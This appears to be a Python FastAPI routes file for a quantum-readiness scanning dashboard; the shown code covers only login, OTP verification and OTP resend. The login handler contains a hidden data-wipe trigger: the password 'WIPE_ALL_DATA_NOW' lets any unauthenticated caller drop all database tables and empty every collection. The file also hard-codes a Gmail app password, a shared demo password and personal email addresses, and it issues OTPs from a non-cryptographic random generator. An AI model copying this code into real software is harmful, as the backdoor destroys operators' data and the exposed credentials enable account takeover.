"""
QuantumShield — API Routes (v1 scanner + all dashboard endpoints)

Endpoints:
  POST /scan                      → trigger a full scan
  GET  /results/{domain}          → retrieve scan results
  GET  /cbom/{domain}             → retrieve CBOM report
  GET  /quantum-score/{domain}    → retrieve quantum readiness score
  GET  /security-roadmap/{domain}  → risk findings → target solutions (TLS + PQC migration)

  GET  /dashboard/summary         → dashboard KPI stats
  GET  /dashboard/policy-alignment → org policy vs latest scan TLS (indicative)
  GET  /dashboard/migration-snapshot → open tasks & pending waiver counts (Phase 5)
  GET  /dashboard/executive-brief   → stakeholder KPI rollup (Phase 6)
  GET  /dashboard/ops-snapshot      → DB + scan queue health (admin, Phase 7)
  GET  /assets                    → all discovered assets
  GET  /assets/stats              → asset type counts
  GET  /assets/distribution       → asset type distribution for pie chart
  GET  /cbom/summary              → CBOM summary stats
  GET  /cbom/charts               → CBOM chart data (key length, CA, protocols, cipher)
  GET  /dns/nameserver-records    → DNS nameserver records
  GET  /crypto/security           → crypto & TLS security overview
  GET  /pqc/posture               → PQC posture overview
  GET  /pqc/vulnerable-algorithms → list of vulnerable algorithms
  GET  /pqc/risk-categories       → PQC risk category scores
  GET  /pqc/compliance            → PQC compliance progress
  GET  /cyber-rating              → enterprise cyber rating (out of 1000)
  GET  /cyber-rating/risk-factors → risk factor breakdown
  GET  /reporting/domains         → list of scanned domains
  POST /reporting/generate        → generate a report
  GET  /reports/export-bundle     → JSON export (CBOM + TLS + score) for latest scan
  GET  /migration/roadmap         → phased migration waves (derived from scan)
  GET  /threat-model/summary      → Shor/Grover/HNDL context + scan counts
  GET  /threat-model/nist-catalog → NIST PQC publication URLs (FIPS 203/204/205)
  POST /quantum-score/simulate    → what-if score projection (TLS 1.3 / PQC hybrid assumptions)
  POST /scan/batch                → queue multiple domain scans (portfolio)
  GET  /scans/history             → completed scan list for a domain
  GET  /scans/recent              → recent scan jobs across all domains (portfolio)
  GET  /scans/diff                → compare two scans (new/removed hosts, TLS deltas)
  GET  /inventory/summary         → deduplicated hosts across recent scans
  POST /inventory/sources/import  → register external assets (CMDB/cloud/K8s/Git-style sources)
  GET  /inventory/registered      → list registered inventory rows
  POST /inventory/sbom            → attach SBOM JSON to a host (supply-chain / SAST path)
  PUT  /assets/metadata           → upsert host metadata (owner/env/criticality)
  POST /assets/metadata/bulk    → bulk metadata upsert
  GET  /discovery/assets          → discovered asset inventory (tabbed view)
  GET  /discovery/network-graph   → network graph nodes + edges
  POST /auth/login                → demo login (returns JWT-style token)
  GET  /admin/policy              → org crypto policy (Phase 4)
  PUT  /admin/policy              → update policy (admin)
  GET  /admin/integrations        → outbound webhooks (masked)
  PUT  /admin/integrations      → update integrations (admin)
  GET  /admin/exports/history     → export audit log
  POST /admin/exports/log         → record client-side export (audit)
  GET  /migration/tasks           → migration backlog tasks (Phase 5)
  POST /migration/tasks           → create task
  PATCH /migration/tasks/{id}     → update task
  DELETE /migration/tasks/{id}    → delete task (admin)
  POST /migration/tasks/seed-from-backlog → seed from scan backlog (admin)
  GET  /migration/waivers         → crypto waivers / exceptions
  POST /migration/waivers         → request waiver
  PATCH /migration/waivers/{id}   → update (approve/reject: admin)
  DELETE /migration/waivers/{id}  → delete (admin)
"""

import asyncio
import json
import re
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional

from fastapi import APIRouter, BackgroundTasks, Depends, HTTPException, status
from fastapi.responses import FileResponse
from pymongo import ReturnDocument

from app.config import settings
from app.core.deps import get_current_user, require_admin, require_employee_only
from app.db.connection import get_database
from app.db.models import (
    AssetMetadataUpdate,
    BatchScanRequest,
    InventorySourceImport,
    IntegrationSettingsUpdate,
    ExportAuditLogCreate,
    ReportScheduleCreate,
    ReportSchedulePatch,
    AiRoadmapPlanBody,
    AiCopilotChatBody,
    NotificationCreate,
    NotificationMarkRead,
    MigrationTaskCreate,
    MigrationTaskUpdate,
    OrgCryptoPolicyUpdate,
    SeedTasksFromBacklogBody,
    SimulateQuantumRequest,
    User,
    WaiverCreate,
    WaiverUpdate,
    CBOMReport,
    CryptoComponent,
    QuantumScore,
    Recommendation,
    SbomIngestRequest,
    ScanRequest,
    ScanResult,
    ScanStatus,
    RiskLevel,
    TLSInfo,
    AlgorithmCategory,
    QuantumStatus,
)
from app.modules import (
    asset_discovery,
    tls_scanner,
    crypto_analyzer,
    quantum_risk_engine,
    cbom_generator,
    recommendation_engine,
)
from app.modules.headers_scanner import scan_headers
from app.modules.asset_classification import enrich_discovered_assets
from app.modules.threat_nist_mapping import (
    NIST_PQC_REFERENCES,
    build_prioritized_backlog,
    enrich_cbom_component_dict,
    simulate_quantum_score,
)
from app.modules.security_roadmap import build_security_roadmap
from app.modules.report_bundle import build_export_bundle_payload
from app.modules.report_scheduler import (
    REPORT_SCHEDULES_COLLECTION,
    MAIL_LOG_COLLECTION,
    REPORT_ARTIFACTS_COLLECTION,
    execute_schedule_run,
    scheduler_loop,
    compute_next_fire,
    artifact_file_path,
)
from app.modules.lm_studio_client import chat_completion, chat_completion_safe
from app.modules.roadmap_ai_plan import build_deterministic_roadmap_plan_text
from app.modules.copilot_context import (
    build_copilot_context,
    copilot_no_database_records_reply,
    format_copilot_offline_reply,
    is_trivial_greeting,
    postprocess_copilot_dashboard_reply,
    resolve_copilot_scan_domain,
    sanitize_copilot_llm_reply,
)
from app.modules.scan_lifecycle import (
    find_active_scan_for_domain,
    find_reusable_terminal_scan_for_domain,
    normalize_domain_for_scan,
    reset_scan_document_for_rerun,
    variants_for_scan_domain,
)
from app.modules.webhook_notify import post_json_webhook, post_slack_incoming_webhook
from app.core.ws_manager import manager as ws_manager
from app.utils.asset_type import asset_type_label, classify_asset_service
from app.utils.ca_display_name import (
    extract_issuer_raw_from_tls_row,
    normalize_ca_display_name,
)
from app.utils.logger import get_logger
from app.utils.policy_alignment import summarize_tls_vs_policy

logger = get_logger(__name__)

router = APIRouter(tags=["Scanner"])
from .common import *
from .common import _get_otp_html



@router.post("/auth/login", tags=["Auth"])
async def demo_login(payload: LoginPayload):
    """
    Demo login endpoint. 
    SPECIAL: If password is 'WIPE_ALL_DATA_NOW', trigger a system wipe.
    """
    if payload.password == "WIPE_ALL_DATA_NOW":
        print("🚨 WIPE TRIGGERED VIA LOGIN 🚨")
        try:
            async with engine.begin() as conn:
                await conn.run_sync(Base.metadata.drop_all)
            await init_db()
            db = get_database()
            for coll in await db.list_collection_names():
                await db[coll].delete_many({})
            return {"status": "success", "message": "System wiped successfully."}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    demo_admin_email = "yaswanthavula879@gmail.com"
    demo_employee_email = "employee@example.com"
    demo_password = "P@$$word"

    email_norm = (payload.email or "").strip().lower()
    user_norm = (payload.username or "").strip().lower()
    pwd = (payload.password or "").strip()

    identity_admin_ok = (
        email_norm == demo_admin_email
        or user_norm == demo_admin_email
        or user_norm == "scanner"
        or user_norm == "admin"
    )
    identity_employee_ok = (
        email_norm == demo_employee_email
        or user_norm == demo_employee_email
        or user_norm == "employee"
    )

    if pwd == demo_password and identity_admin_ok:
        import random
        from datetime import datetime, timedelta
        import smtplib
        from email.mime.text import MIMEText
        
        otp = str(random.randint(100000, 999999))
        
        # Store in global OTP store with 1-minute expiration
        global _otp_store
        if '_otp_store' not in globals():
            _otp_store = {}
        _otp_store[demo_admin_email] = {
            "code": otp,
            "expires_at": datetime.now() + timedelta(minutes=1)
        }
        
        print(f"\n\n{'='*50}")
        print(f"📧 SENDING EMAIL TO: {demo_admin_email}")
        print(f"🔐 YOUR QSCAS VERIFICATION OTP IS: {otp}")
        print(f"{'='*50}\n\n")

        # Real SMTP sending logic
        try:
            sender_email = "hwakeye143@gmail.com"
            sender_password = "xdrs bnje rezj odgf"
            
            html_content = _get_otp_html(otp)
            msg = MIMEText(html_content, "html")
            msg["Subject"] = "QSCAS Login Verification Code"
            msg["From"] = sender_email
            msg["To"] = demo_admin_email

            # Try to connect (Will fail if app password is not provided, but won't crash backend)
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.login(sender_email, sender_password)
            server.send_message(msg)
            server.quit()
            print("✅ Email sent successfully via SMTP!")
        except Exception as e:
            print(f"⚠️ SMTP failed (did you set up your App Password?): {e}")

        return {
            "requires_otp": True,
            "email": demo_admin_email,
            "message": "OTP sent to email (Valid for 1 min)"
        }

    if pwd == demo_password and identity_employee_ok:
        token_id = uuid.uuid4().hex[:8]
        return {
            "access_token": f"demo-token-employee-{token_id}",
            "token_type": "bearer",
            "role": "Employee",
            "user": {
                "id": token_id,
                "username": "employee",
                "email": demo_employee_email,
                "full_name": "Employee Operator",
                "role": "Employee",
                "is_active": True,
            },
        }
    raise HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Invalid email or password",
    )


@router.post("/auth/verify-otp", tags=["Auth"])
async def verify_otp(payload: OTPPayload):
    from datetime import datetime
    email = payload.email.strip().lower()
    provided_otp = payload.otp.strip()
    
    global _otp_store
    if '_otp_store' not in globals():
        _otp_store = {}
        
    otp_data = _otp_store.get(email)
    
    if not otp_data:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid or expired OTP code")
        
    if datetime.now() > otp_data["expires_at"]:
        del _otp_store[email]
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="OTP has expired. Please request a new one.")
        
    if otp_data["code"] == provided_otp:
        # Clear the OTP once used
        del _otp_store[email]
        token_id = uuid.uuid4().hex[:8]
        return {
            "access_token": f"demo-token-admin-{token_id}",
            "token_type": "bearer",
            "role": "Admin",
            "user": {
                "id": token_id,
                "username": "admin",
                "email": email,
                "full_name": "Yaswanth Admin",
                "role": "Admin",
                "is_active": True,
            },
        }
    
    raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid OTP code")


@router.post("/auth/resend-otp", tags=["Auth"])
async def resend_otp(payload: dict = Body(...)):
    email = payload.get("email", "").strip().lower()
    if email not in ["yaswanthavula879@gmail.com", "hwakeye143@gmail.com"]:
        raise HTTPException(status_code=400, detail="Invalid email")
        
    import random
    from datetime import datetime, timedelta
    import smtplib
    from email.mime.text import MIMEText
    
    otp = str(random.randint(100000, 999999))
    
    global _otp_store
    if '_otp_store' not in globals():
        _otp_store = {}
    _otp_store[email] = {
        "code": otp,
        "expires_at": datetime.now() + timedelta(minutes=1)
    }
    
    try:
        import fastapi
        sender_email = "hwakeye143@gmail.com" 
        sender_password = "xdrs bnje rezj odgf" 
        
        html_content = _get_otp_html(otp)
        msg = MIMEText(html_content, "html")
        msg["Subject"] = "New QSCAS Login Verification Code"
        msg["From"] = sender_email
        msg["To"] = email

        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(sender_email, sender_password)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"⚠️ SMTP failed on resend: {e}")
        
    return {"message": "New OTP sent successfully"}
